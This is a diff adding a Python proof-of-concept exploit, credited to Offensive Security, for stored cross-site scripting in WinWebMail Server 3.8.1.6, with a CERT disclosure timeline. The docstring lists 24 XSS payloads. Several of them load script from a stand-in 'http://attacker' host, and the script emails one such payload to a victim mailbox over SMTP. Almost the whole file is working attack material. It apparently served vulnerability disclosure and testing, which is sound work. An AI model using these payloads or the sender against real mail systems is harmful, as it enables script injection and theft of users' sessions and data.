@@ -1,0 +1,81 @@
+#!/usr/bin/python
+
+'''
+
+Author: loneferret of Offensive Security
+Product: WinWebMail Server
+Version: 3.8.1.6
+Vendor Site: http://www.winwebmail.net
+Software Download: http://www.winwebmail.net/email-server-download.html
+
+Timeline:
+29 May 2012: Vulnerability reported to CERT
+30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
+23 Jul 2012: Update from CERT: No response from vendor
+08 Aug 2012: Public Disclosure
+
+Installed On: Windows Server 2003 SP2
+Client Test OS: Window 7 Pro SP1 (x86)
+Browser Used: Internet Explorer 9
+
+Injection Point: Body
+Injection Payload(s):
+1: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+2: <SCRIPT>alert('XSS')</SCRIPT>
+3: <SCRIPT SRC=http://attacker/xss.js></SCRIPT>
+4: <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+5: <DIV STYLE="width: expression(alert('XSS'));">
+6: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+7: exp/*<XSS STYLE='no\xss:noxss("*//*");
+xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+8: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+9: <XSS STYLE="xss:expression(alert('XSS'))">
+10: <!--[if gte IE 4]>
+<SCRIPT>alert('XSS');</SCRIPT>
+<![endif]--
+11: <SCRIPT SRC="http://attacker/xss.jpg"></SCRIPT>
+12: <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+13: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
+14: <SCRIPT/XSS SRC="http://attacker/xss.js"></SCRIPT>
+15: <<SCRIPT>alert("XSS");//<</SCRIPT>
+16: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+17: <SCRIPT>a=/XSS/
+alert(a.source)</SCRIPT>
+18: <SCRIPT a=">" SRC="http://attacker/xss.js"></SCRIPT>
+19: <SCRIPT ="blah" SRC="http://attacker/xss.js"></SCRIPT>
+20: <SCRIPT a="blah" '' SRC="http://attacker/xss.js"></SCRIPT>
+21: <SCRIPT "a='>'" SRC="http://attacker/xss.js"></SCRIPT>
+22: <SCRIPT a=`>` SRC="http://attacker/xss.js"></SCRIPT>
+23: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://attacker/xss.js"></SCRIPT>
+24: <SCRIPT a=">'>" SRC="http://attacker/xss.js"></SCRIPT>
+
+'''
+
+import smtplib, urllib2
+ 
+payload = """<SCRIPT a=`>` SRC="http://attacker/xss.js"></SCRIPT>"""
+ 
+def sendMail(dstemail, frmemail, smtpsrv, username, password):
+        msg  = "From: hacker@offsec.local\n"
+        msg += "To: victim@victim.local\n"
+        msg += 'Date: Today\r\n'
+        msg += "Subject: Offensive Security\n"
+        msg += "Content-type: text/html\n\n"
+        msg += "XSS" + payload + "\r\n\r\n"
+        server = smtplib.SMTP(smtpsrv)
+        server.login(username,password)
+        try:
+                server.sendmail(frmemail, dstemail, msg)
+        except Exception, e:
+                print "[-] Failed to send email:"
+                print "[*] " + str(e)
+        server.quit()
+ 
+username = "hacker@offsec.local"
+password = "123456"
+dstemail = "victim@victim.local"
+frmemail = "hacker@offsec.local"
+smtpsrv  = "172.16.84.171"
+ 
+print "[*] Sending Email"
+sendMail(dstemail, frmemail, smtpsrv, username, password)
